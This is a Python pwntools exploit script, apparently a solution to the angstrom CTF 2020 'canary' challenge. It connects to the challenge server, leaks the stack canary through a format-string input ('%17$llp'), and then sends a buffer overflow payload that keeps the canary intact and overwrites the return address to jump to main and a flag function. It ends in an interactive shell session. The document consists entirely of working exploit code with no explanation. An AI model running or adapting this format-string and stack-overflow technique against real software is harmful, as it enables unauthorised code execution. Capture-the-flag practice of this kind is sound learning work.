from pwn import *
from struct import pack
import sys

# for canary challenge angstrom 2020


# leak = '%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx'

context.arch='amd64'
#sh = ELF("./canary")
#sh = process("./canary")
sh = remote("shell.actf.co",20701)

#p = lambda x : pack("<QQ",x)
canary =''
leak = "%17$llp"

offset = "A"*56
padding = "A"*8
flag = p64(0x0000000000400787)
main = p64(0x0000000000400957)

sh.recvuntil("name? ")
sh.sendline(leak)
cookie = sh.recvuntil("!")
cookie = cookie.split(", ")[1]
print("[?] Canary:"+cookie[:len(cookie)-1])

canary = cookie[2:len(cookie)-1].decode("hex")[::-1]
print("[?] Canary redone")
print(canary)

payload = ''
payload += offset
payload += canary
payload += padding
payload += main
payload += flag

sh.recvuntil("me? ")
sh.sendline(payload)
print("[?] Payload sent")
print("[?] Recall main(), flag()")
print("[?] Enter through process")
#sh.recvall()
sh.interactive()
